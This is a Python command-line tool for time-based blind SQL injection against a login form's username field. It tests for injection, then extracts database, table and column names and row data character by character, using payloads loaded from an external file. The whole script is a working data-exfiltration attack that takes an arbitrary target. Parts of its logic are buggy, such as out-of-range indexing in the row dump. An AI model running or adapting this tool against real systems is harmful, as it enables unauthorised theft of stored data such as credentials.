import requests
import string
import time
import json
import argparse

INTERVAL = 5 # The interval between each request, change it to a higher value to avoid getting blocked by the server

def check_sqli(target: str) -> bool:
    r = requests.post(target, data={"username": "'", "password": "test"})
    if r.status_code == 500:
        return True
    return False

def check_end(payload: str, current: str) -> bool:
    payload = payload.replace("FUZZ", current).replace("LIKE", "=").replace("%", "")
    r = requests.post(target, data={"username": payload, "password": "test"})
    if r.elapsed.total_seconds() > 5 and r.status_code  != 500:
        return True
    return False

def find_db_name(target: str) -> str:
    running = True
    DB_NAME = ""
    with open("payloads.json", "r") as f:
        payloads = json.load(f)["db_name"]
        for payload in payloads:
            while running:
                for i in range(len(string.ascii_lowercase) + 1):
                    curr_char = string.ascii_lowercase[i]
                    print(DB_NAME + curr_char, end="\r")
                    current_payload = payload.replace("FUZZ", DB_NAME + curr_char)
                    r = requests.post(target, data={"username": current_payload, "password": "test"})
                    if r.elapsed.total_seconds() > 5 and r.status_code  != 500:
                        print(f"Found a new letter: {curr_char}")
                        DB_NAME += curr_char
                        i = 0
                        if check_end(payload=current_payload, current=DB_NAME):
                            print(f"Found db_name: {DB_NAME}")
                            running = False
                            return DB_NAME
                        else:
                            break
                    time.sleep(INTERVAL)
                if(i == len(string.ascii_lowercase) and DB_NAME == ""):
                    print("DB_NAME not found")
                    running = False
                    return None


def find_table_name(target: str, db_name: str):
    running = True
    TABLE_NAME = ""
    with open("payloads.json", "r") as f:
        payloads = json.load(f)["table"]
        for payload in payloads:
            while running:
                for i in range(len(string.ascii_lowercase) + 1):
                    curr_char = string.ascii_lowercase[i]
                    print(TABLE_NAME + curr_char, end="\r")
                    current_payload = payload.replace("FUZZ", TABLE_NAME + curr_char).replace("DB_NAME", db_name)
                    r = requests.post(target, data={"username": current_payload, "password": "test"})
                    if r.elapsed.total_seconds() > 5 and r.status_code  != 500:
                        print(f"Found a new letter: {curr_char}")
                        TABLE_NAME += curr_char
                        i = 0
                        if check_end(payload=current_payload, current=TABLE_NAME):
                            print(f"Found table: {TABLE_NAME}")
                            running = False
                            return TABLE_NAME
                        else:
                            break
                    time.sleep(INTERVAL)
                if(i == len(string.ascii_lowercase) and TABLE_NAME == ""):
                    print("Table not found")
                    running = False
                    return None

def find_column_name(target: str, db_name: str, table_name: str):
    running = True
    COLUMN_NAME = ""
    with open("payloads.json", "r") as f:
        payloads = json.load(f)["column"]
        for payload in payloads:
            while running:
                for i in range(len(string.ascii_lowercase) + 1):
                    curr_char = string.ascii_lowercase[i]
                    print(COLUMN_NAME + curr_char, end="\r")
                    current_payload = payload.replace("FUZZ", COLUMN_NAME + curr_char).replace("DB_NAME", db_name).replace("TABLE_NAME", table_name)
                    r = requests.post(target, data={"username": current_payload, "password": "test"})
                    if r.elapsed.total_seconds() > 5 and r.status_code  != 500:
                        print(f"Found a new letter: {curr_char}")
                        COLUMN_NAME += curr_char
                        i = 0
                        if check_end(payload=current_payload, current=COLUMN_NAME):
                            print(f"Found column: {COLUMN_NAME}")
                            running = False
                            return COLUMN_NAME
                        else:
                            break
                    time.sleep(INTERVAL)
                if(i == len(string.ascii_lowercase) and COLUMN_NAME == ""):
                    print("Column not found")
                    running = False
                    return None
                    

def find_row(target: str, table_name: str, column_name: str):
    running = True
    ROW = ""
    with open("payloads.json", "r") as f:
        payloads = json.load(f)["row"]
        for payload in payloads:
            while running:
                for i in range(len(string.ascii_lowercase + string.digits + string.punctuation) + 1):
                    curr_char = string.ascii_lowercase[i]
                    print(ROW + curr_char, end="\r")
                    current_payload = payload.replace("FUZZ", ROW + curr_char).replace("TABLE_NAME", table_name).replace("COLUMN_NAME", column_name)
                    r = requests.post(target, data={"username": current_payload, "password": "test"})
                    if r.elapsed.total_seconds() > 5 and r.status_code  != 500:
                        print(f"Found a new letter: {curr_char}")
                        ROW += curr_char
                        i = 0
                        if check_end(payload=current_payload, current=ROW):
                            print(f"Found {column_name}: {ROW}")
                            running = False
                            return ROW
                        else:
                            break
                    time.sleep(INTERVAL)
                if(i == len(string.ascii_lowercase) and ROW == ""):
                    print("Row not found")
                    running = False
                    return None

parser = argparse.ArgumentParser()
parser.add_argument("target", help="The target to test")
parser.add_argument("-D", help="Dump the database name", action="store_true")
parser.add_argument("--db", help="The database name")
parser.add_argument("-T", help="Dump the table name", action="store_true")
parser.add_argument("--table", help="The table name")
parser.add_argument("-C", help="Dump a column name", action="store_true")
parser.add_argument("--column", help="The column name")
parser.add_argument("-R", help="Dump a row", action="store_true")




args = parser.parse_args()

target = args.target
print("Target: " + target)
print("Checking if the target is vulnerable")
if check_sqli(target=target):
    print("The target is vulnerable")
    if args.D:
        print("Dumping the database name")
        find_db_name(target=target)
    if args.T:
        print("Dumping the table name")
        db_name = args.db
        find_table_name(target=target, db_name=db_name)
    if args.C:
        print("Dumping a column name")
        db_name = args.db
        table_name = args.table
        find_column_name(target=target, db_name=db_name, table_name=table_name)
    if args.R:
        print("Dumping a row")
        table_name = args.table
        column_name = args.column
        find_row(target=target, table_name=table_name, column_name=column_name)
else:
    print("The target doesn't seem to be vulnerable, exiting...")

